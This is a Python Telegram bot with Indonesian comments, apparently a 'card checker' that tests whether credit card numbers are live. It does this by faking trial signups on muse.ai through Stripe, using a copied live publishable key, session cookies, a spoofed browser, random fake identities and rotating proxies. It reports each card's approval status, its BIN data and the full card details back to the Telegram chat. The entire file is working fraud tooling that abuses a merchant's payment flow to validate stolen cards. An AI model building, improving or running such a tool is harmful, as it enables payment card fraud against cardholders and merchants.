import asyncio
import httpx
import random
import string
import logging
import os
from faker import Faker

from telegram import Update, constants
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# --- KONFIGURASI ---
# Ambil token dari environment variable (GitHub Secrets)
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")

# Inisialisasi Faker untuk data acak
fake = Faker()

# Konfigurasi logging dasar
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- GLOBAL VARIABLES ---
PROXIES = [] # List untuk menyimpan proxy yang dimuat

# --- DATA DARI FILE LOG (HCY) ---
STRIPE_KEY = "pk_live_a6DCdatuNGQFYQOaddF0Guf3"
MUSE_COOKIES = {
    # Cookies... (sama seperti sebelumnya)
    "mode": "light", "_ga": "GA1.1.624514859.1750016648", "_gcl_au": "1.1.1507302922.1750016648",
    "intercom-id-zu1nwzdd": "939b1207-6933-43fc-941c-f6f197d063fd", "intercom-session-zu1nwzdd": "",
    "intercom-device-id-zu1nwzdd": "9bd14dc9-1628-427a-95cf-64c7241079cd", "__stripe_mid": "9c2e3b31-8c5f-430d-8345-dbd520b386d5be127e",
    "ab_pricing": "0", "ab_landing": "0", "__stripe_sid": "5073db46-415c-4e23-835e-accd767e84826b6b8e",
    "_ga_S9Q9QN5EN6": "GS2.1.s1750440172$o14$g1$t1750440223$j9$l0$h0",
}
BASE_HEADERS = {
    # Headers... (sama seperti sebelumnya)
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "accept": "application/json, text/javascript, */*; q=0.01", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "sec-ch-ua": "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"", "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
}

# --- FUNGSI HELPER ---

def load_proxies():
    """Memuat proxy dari file proxies.txt ke dalam list global PROXIES."""
    global PROXIES
    try:
        with open('proxies.txt', 'r') as f:
            PROXIES = [line.strip() for line in f if line.strip()]
        if PROXIES:
            logger.info(f"Successfully loaded {len(PROXIES)} proxies.")
        else:
            logger.warning("proxies.txt is empty. Running without proxies.")
    except FileNotFoundError:
        logger.warning("proxies.txt not found. Running without proxies.")
    except Exception as e:
        logger.error(f"Error loading proxies: {e}")

def get_random_email():
    """Menghasilkan email acak."""
    domain = random.choice(["outlook.com", "gmail.com", "yahoo.com"])
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{username}@{domain}"

async def get_bin_info(bin_number: str):
    """Mendapatkan informasi BIN dari binlist.net."""
    # ... (fungsi ini tidak berubah)
    if len(bin_number) < 6: return None
    bin_to_check = bin_number[:6]
    url = f"https://lookup.binlist.net/{bin_to_check}"
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(url, headers={'Accept-Version': '3'})
            return response.json() if response.status_code == 200 else None
    except Exception as e:
        logger.error(f"Error getting BIN info: {e}")
        return None

def format_bin_info(bin_data):
    """Memformat informasi BIN menjadi string yang rapi."""
    # ... (fungsi ini tidak berubah)
    if not bin_data:
        return "⇻ Brand: Unknown\n⇻ Type: Unknown\n⇻ Bank: Unknown\n⇻ Country: Unknown"
    brand = bin_data.get('scheme', 'Unknown').upper()
    card_type = bin_data.get('type', 'Unknown').upper()
    bank = bin_data.get('bank', {}).get('name', 'Unknown').upper()
    country = bin_data.get('country', {}).get('name', 'Unknown').upper()
    country_flag = bin_data.get('country', {}).get('emoji', '')
    return f"⇻ Brand: {brand}\n⇻ Type: {card_type}\n⇻ Bank: {bank}\n⇻ Country: {country} {country_flag}"

def get_decline_message(code):
    """Mendapatkan pesan yang lebih ramah dari kode penolakan Stripe."""
    # ... (fungsi ini tidak berubah, Anda bisa tambahkan kode penolakan lain jika perlu)
    decline_codes = { "do_not_honor": "Penerbit kartu menolak pembayaran.", "insufficient_funds": "Dana tidak mencukupi.", "expired_card": "Kartu telah kedaluwarsa.", "fraudulent": "Pembayaran dianggap penipuan.", "card_not_supported": "Kartu tidak didukung.", "incorrect_cvc": "CVC salah.", "processing_error": "Kesalahan pemrosesan." }
    return decline_codes.get(code, code.replace("_", " ").capitalize())

# --- FUNGSI UTAMA PENGUJIAN KARTU ---

async def check_card_on_muse(cc, mm, yy, cvc, proxy_url=None):
    """
    Melakukan alur untuk memeriksa kartu kredit, dengan opsi menggunakan proxy.
    """
    name = fake.name()
    email = get_random_email()

    # Siapkan konfigurasi proxy untuk httpx
    httpx_proxies = {"http://": proxy_url, "https://": proxy_url} if proxy_url else None
    
    async with httpx.AsyncClient(cookies=MUSE_COOKIES, proxies=httpx_proxies, timeout=30.0) as client:
        try:
            # LANGKAH 1: Buat Payment Method di Stripe
            pm_data = {
                'type': 'card', 'billing_details[name]': name, 'billing_details[email]': email,
                'card[number]': cc, 'card[cvc]': cvc, 'card[exp_month]': mm, 'card[exp_year]': yy,
                'guid': 'bbeb7dc1-2f34-4cba-9e5a-d39fa215300a0b6163', 'muid': '9c2e3b31-8c5f-430d-8345-dbd520b386d5be127e',
                'sid': '5073db46-415c-4e23-835e-accd767e84826b6b8e', 'payment_user_agent': 'stripe.js/22a1c02c9a',
                'time_on_page': str(random.randint(50000, 60000)), 'key': STRIPE_KEY,
            }
            stripe_headers = {**BASE_HEADERS, "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/"}
            pm_resp = await client.post("https://api.stripe.com/v1/payment_methods", data=pm_data, headers=stripe_headers)
            
            if pm_resp.status_code != 200:
                # Cek jika ada error dari Stripe terkait kartu
                error_data = pm_resp.json().get("error", {})
                if error_data.get("type") == "card_error":
                    code = error_data.get("decline_code") or error_data.get("code", "card_error")
                    return {"status": "declined", "code": code, "message": get_decline_message(code)}
                return {"status": "error", "message": "Failed to create Stripe Payment Method."}
            
            pm_id = pm_resp.json().get("id")
            if not pm_id:
                 return {"status": "error", "message": "Could not get Payment Method ID."}

            # LANGKAH 2: Mulai Pembayaran di Muse.ai
            start_payload = { "email": email, "name": name, "trial": 1, "tier": "basic", "cost_month": 16, "duration": 2629800, "access": "", "referral": "", "pm": pm_id, "ab_pricing": 0, "ab_landing": 0 }
            start_headers = {**BASE_HEADERS, "content-type": "application/json; charset=UTF-8", "origin": "https://muse.ai", "referer": "https://muse.ai/join", "x-requested-with": "XMLHttpRequest"}
            start_resp = await client.post("https://muse.ai/api/pay/start", json=start_payload, headers=start_headers)
            
            if start_resp.status_code != 200:
                return {"status": "error", "message": f"Muse.ai /start API failed."}
            
            start_data = start_resp.json()
            client_secret, seti_id = start_data.get("secret"), start_data.get("id")
            if not client_secret or not seti_id:
                return {"status": "error", "message": "Could not get client_secret from muse.ai."}

            # LANGKAH 3: Konfirmasi Setup Intent di Stripe (Momen Penentuan)
            confirm_data = {'key': STRIPE_KEY, 'client_secret': client_secret, 'payment_method': pm_id}
            confirm_resp = await client.post(f"https://api.stripe.com/v1/setup_intents/{seti_id}/confirm", data=confirm_data, headers=stripe_headers)
            
            confirm_json = confirm_resp.json()
            
            if confirm_resp.status_code == 200 and confirm_json.get("status") == "succeeded":
                return {"status": "approved", "code": "succeeded", "message": "Your card has been authorized."}
            
            error = confirm_json.get("last_setup_error") or confirm_json.get("error", {})
            code = error.get("decline_code") or error.get("code", "unknown_decline")
            return {"status": "declined", "code": code, "message": get_decline_message(code)}

        except httpx.ProxyError:
            return {"status": "error", "message": f"Proxy connection failed: {proxy_url}"}
        except httpx.ReadTimeout:
            return {"status": "error", "message": "Request timed out. Please try again."}
        except Exception as e:
            logger.error(f"An unexpected error occurred: {e}", exc_info=True)
            return {"status": "error", "message": f"An unexpected error occurred."}

# --- HANDLER PERINTAH TELEGRAM ---

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # ... (fungsi ini tidak berubah)
    user = update.effective_user
    message = ( f"👋 Welcome, {user.mention_html()}!\n\n" "<b>Available Commands:</b>\n\n" "<code>/au cc|mm|yy|cvc</code> - Check a credit card.\n\n" "<b>Bot by:</b> Secure Auth Team" )
    await update.message.reply_html(message)

async def au_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # ... (fungsi ini sedikit diperbarui)
    user = update.effective_user
    try:
        card_info = update.message.text.split(maxsplit=1)[1]
        cc, mm, yy, cvc = card_info.split('|')
        if len(yy) == 2: yy = "20" + yy
        if not all(x.isdigit() for x in [cc, mm, yy, cvc]) or len(cc) < 12: raise ValueError
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Format Salah. Gunakan: /au cc|mm|yy|cvc")
        return

    checking_msg = await update.message.reply_text("⏳ Checking...")

    # Pilih proxy secara acak jika ada
    proxy_to_use = random.choice(PROXIES) if PROXIES else None
    
    # Jalankan pemeriksaan
    check_task = asyncio.create_task(check_card_on_muse(cc, mm, yy, cvc, proxy_url=proxy_to_use))
    bin_task = asyncio.create_task(get_bin_info(cc))
    
    result, bin_data = await check_task, await bin_task
    
    # Format pesan hasil
    full_cc_info = f"{cc}|{mm}|{yy}|{cvc}"
    bin_info_str = format_bin_info(bin_data)
    
    final_message = "↬ Secure | Auth ↫\n- - - - - - - - - - - - - - - - - - - - -\n"
    final_message += f"⇻ CC: {full_cc_info}\n"
    
    if result['status'] == 'approved':
        final_message += "⇻ Status: Approved! ✅\n"
        final_message += f"⇻ Result: {result['message']}\n"
        final_message += f"⇻ Code: {result['code'].capitalize()}\n"
    elif result['status'] == 'declined':
        final_message += "⇻ Status: Decline! ❌\n"
        final_message += f"⇻ Result: {result['message']}\n"
        final_message += f"⇻ Code: {result['code']}\n"
    else:
        final_message += "⇻ Status: Error! ⚠️\n"
        final_message += f"⇻ Result: {result['message']}\n"

    final_message += "- - - - - - - - - - - - - - - - - - - - -\n"
    final_message += f"{bin_info_str}\n"
    final_message += "- - - - - - - - - - - - - - - - - - - - -\n"
    final_message += f"⇻ Proxy: {proxy_to_use or 'None'}\n"
    final_message += f"(↯) Checked by: @{user.username or user.first_name}"
    
    await checking_msg.edit_text(final_message)


def main():
    """Mulai bot."""
    if not TELEGRAM_BOT_TOKEN:
        print("!!! KESALAHAN: TELEGRAM_BOT_TOKEN tidak ditemukan. Harap atur di environment variable/secrets.")
        return
    
    # Muat proxy saat bot pertama kali dijalankan
    load_proxies()
        
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("au", au_command))

    print("Bot is running...")
    application.run_polling()


if __name__ == "__main__":
    main()
